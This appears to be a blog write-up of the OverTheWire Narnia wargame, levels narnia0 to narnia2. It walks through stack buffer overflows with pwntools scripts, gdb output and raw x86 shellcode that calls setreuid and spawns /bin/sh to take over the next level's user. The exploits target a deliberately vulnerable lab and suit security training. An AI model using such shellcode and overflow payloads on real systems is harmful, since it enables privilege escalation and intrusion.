---
layout: post
title: "OverTheWire Narnia"
date: 2024-08-19 +0200
categories: jekyll update
---
[https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/) 🦁
```sh
ssh narnia0@narnia.labs.overthewire.org -p 2226
```

I'm using [pwntools](https://github.com/Gallopsled/pwntools) in a Kali Linux VM to make it easier to solve the levels. OverTheWire also seems to include python3 and pwntools.

## Observations
There is a `/narnia` folder and the passwords are in `/etc/narnia_pass`. The levels also include C source code.
```sh
find / -type f -name '*narnia*' 2> /dev/null
/etc/issue.narnia
/etc/issue.narnia.fail
/etc/issue.narnia.localhost
/etc/narnia_pass/narnia0
/etc/narnia_pass/narnia1
/etc/narnia_pass/narnia2
/etc/narnia_pass/narnia3
/etc/narnia_pass/narnia4
/etc/narnia_pass/narnia5
/etc/narnia_pass/narnia6
/etc/narnia_pass/narnia7
/etc/narnia_pass/narnia8
/etc/narnia_pass/narnia9
/etc/ssh/sshd_config.d/narnia.conf
/narnia/narnia0
/narnia/narnia0.c
/narnia/narnia1
/narnia/narnia1.c
/narnia/narnia2
/narnia/narnia2.c
/narnia/narnia3
/narnia/narnia3.c
/narnia/narnia4
/narnia/narnia4.c
/narnia/narnia5
/narnia/narnia5.c
/narnia/narnia6
/narnia/narnia6.c
/narnia/narnia7
/narnia/narnia7.c
/narnia/narnia8
/narnia/narnia8.c

ls /etc/narnia_pass/ -la
-r--------   1 narnia0 narnia0     8 Jul 17 15:58 narnia0
-r--------   1 narnia1 narnia1    11 Jul 17 15:58 narnia1
-r--------   1 narnia2 narnia2    11 Jul 17 15:58 narnia2
-r--------   1 narnia3 narnia3    11 Jul 17 15:58 narnia3
-r--------   1 narnia4 narnia4    11 Jul 17 15:58 narnia4
-r--------   1 narnia5 narnia5    11 Jul 17 15:58 narnia5
-r--------   1 narnia6 narnia6    11 Jul 17 15:58 narnia6
-r--------   1 narnia7 narnia7    11 Jul 17 15:58 narnia7
-r--------   1 narnia8 narnia8    11 Jul 17 15:58 narnia8
-r--------   1 narnia9 narnia9    11 Jul 17 15:58 narnia9
```

## narnia0
`cat /narnia/narnia0.c`
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

The binary reads the input and we somehow have to change `val` from `0x41414141` to `0xdeadbeef` to pass the check.
The issue is the buffer is 20 bytes but `scanf()` is reading 24 characters into it. It also has some helpful printf messsages.

To use pwntools I can put the python scripts in folder in `/tmp`. The `val` variable on the stack gets overwritten with `BCDE (0x45444342)` so that works.
```py
from pwn import *
s = "A" * 20
s += "BCDE"
p = process('/narnia/narnia0')
s1 = p.recvline()
p.sendline(s)
p.interactive()
```
```
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABCDE
val: 0x45444342
WAY OFF!!!!
```

Now we we should be able overwrite it with `0xdeadbeef` by packing it into a 32 bit integer.
```py
from pwn import *
s = b"A" * 20
s += p32(0xdeadbeef)
p = process('/narnia/narnia0')
s1 = p.recvline()
p.sendline(s)
p.interactive()
```
```
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ\xde
val: 0xdeadbeef
$ whoami
narnia1

$ cat /etc/narnia_pass/narnia1
```

## narnia1
`cat /narnia/narnia1.c`
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

It's looking for an egg 🥚 environment variable so we need to define it at least. Let's try printing the password with cat.
```sh
export EGG="cat /etc/narnia_pass/narnia1"

/narnia/narnia1
Trying to execute EGG!
Segmentation fault (core dumped)
```
Apparently it directly executes a function so we need some kind of [shellcode](https://www.exploit-db.com/exploits/44594). This popped the shell with `execve("/bin/sh")` but the uid was still 14001 (narnia1). I noticed there were multiple people in the OTW discord having the same problem.
```py
export EGG=$(python3 -c ex'import sys; sys.stdout.buffer.write(b"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')
/narnia/narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
cat: /etc/narnia_pass/narnia2: Permission denied

$ whoami
narnia1

$ id
uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
```

The narnia0 level hints this with the `setreuid(geteuid(),geteuid())` call, which is included in this [shellcode](https://security.stackexchange.com/questions/184842/shellcode-does-not-execute-as-the-owner).
Note that python3 has some [issues](https://stackoverflow.com/questions/39424833/outputting-hex-values-in-python3) with handling hex strings which requires calling `sys.stdout.buffer.write` instead of `print`.
```py
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')
/narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2

$ id
uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)

$ cat /etc/narnia_pass/narnia2
```

## narnia2
`cat /narnia/narnia2.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
```py
/narnia/narnia2 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 132 + b"BBBB")')
```
Let's debug the buffer overflow; `eip` gets overwritten with BBBB so we should execute some shellcode and also call `setreuid()` to narnia3's uid.
```sh
gdb /narnia/narnia2
run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 132 + b"BBBB")')
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()
```
